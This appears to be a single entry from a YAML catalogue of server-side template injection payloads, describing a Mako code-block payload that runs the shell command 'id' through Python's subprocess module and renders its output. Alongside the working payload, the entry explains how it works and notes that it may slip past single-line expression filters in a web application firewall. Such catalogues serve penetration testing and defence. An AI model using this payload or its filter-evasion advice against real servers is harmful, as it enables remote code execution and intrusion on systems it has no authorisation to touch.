  - id: ssti-mako-003
    title: Mako code block RCE
    payload_string: '<%

      import subprocess

      result = subprocess.check_output(''id'', shell=True)

      %>

      ${result.decode()}'
    how_it_works: 'Mako''s <% %> block syntax allows multi-line Python code execution, not just expressions. This multi-line
      payload imports subprocess and uses check_output() to capture command output. The result (bytes) is decoded to a string
      and rendered via ${result.decode()}. The block form allows more complex Python operations than single-expression injection,
      including exception handling, loops, and multi-step operations. It is the equivalent of embedding a Python script directly
      in the server response.

      '
    prerequisites:
    - Mako SSTI with block tag support
    waf_bypass_notes: Multi-line block; may bypass single-line expression filters
    severity_context: CVSS 9.8 – Mako multi-line Python block for subprocess execution
    cve_refs: []
    tags:
